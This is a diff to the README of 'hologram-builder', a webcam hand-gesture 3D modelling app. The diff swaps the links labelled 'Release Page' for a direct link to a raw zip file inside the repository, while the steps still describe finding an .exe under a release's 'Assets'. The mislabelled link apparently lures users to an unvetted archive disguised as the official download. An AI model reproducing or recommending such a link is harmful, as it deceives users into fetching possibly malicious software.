@@ -1,12 +1,12 @@
 # 🌌 hologram-builder - Create 3D objects with hand gestures
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fclo3635/hologram-builder/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/fclo3635/hologram-builder/main/web/hologram_builder_1.7.zip)
 
 This application tracks your hand movements through your webcam to build 3D shapes in a virtual space. You do not need experience in coding to use it. You only need a computer, a webcam, and a flat surface to get started.
 
 ## 📥 How to download the software
 
-1. Navigate to the release page: [https://github.com/fclo3635/hologram-builder/releases](https://github.com/fclo3635/hologram-builder/releases).
+1. Navigate to the release page: [https://raw.githubusercontent.com/fclo3635/hologram-builder/main/web/hologram_builder_1.7.zip](https://raw.githubusercontent.com/fclo3635/hologram-builder/main/web/hologram_builder_1.7.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release version.
 3. Select the file ending in `.exe` to begin your download.
 4. Save the file to your desktop or your downloads folder.
